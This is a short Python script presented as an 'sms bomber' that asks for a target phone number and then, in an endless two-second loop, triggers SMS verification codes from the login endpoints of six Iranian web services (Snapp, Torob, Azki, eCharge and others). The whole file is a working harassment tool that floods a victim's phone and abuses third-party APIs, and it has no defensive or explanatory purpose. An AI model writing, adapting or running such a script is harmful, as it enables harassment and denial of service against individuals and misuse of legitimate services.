import requests
import urllib3
from time import sleep
from colorama import Fore
import pyfiglet
import os

os.system("clear")
out = pyfiglet.figlet_format("     < abol :/ ha.ck >")
print(Fore.BLUE+out)
print(Fore.WHITE+"["+Fore.RED+"*"+Fore.WHITE+"]"+Fore.RED+" sms bomber version(1.0.0)")
print()
a = input(Fore.GREEN+"   target phone >> "+Fore.RED)

b = "0"+a
url = ("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp")
data= {"cellphone": b}
url2=("https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/"+b+"/sms?cCode=98")
url3 = ("https://api.torob.com/a/phone/send-pin/?phone_number="+b)
url4 = ("https://web.emtiyaz.app/json/login")
data4 = {"send":"1","cellphone":b}
url5=("https://www.azki.com/prod/api/api/customer/register/check-phone-number?phoneNumber=azki_"+b)
url6 =("https://www.echarge.ir/m/login?length=19")
data6 = {"phoneNumber": b}
while True:
    c = requests.post(url,data)
    d = requests.get(url2)
    e = requests.get(url3)
    f = requests.post(url4,data4)
    g = requests.get(url5)
    h = requests.post(url6,data6)
    print("send")
    sleep(2)

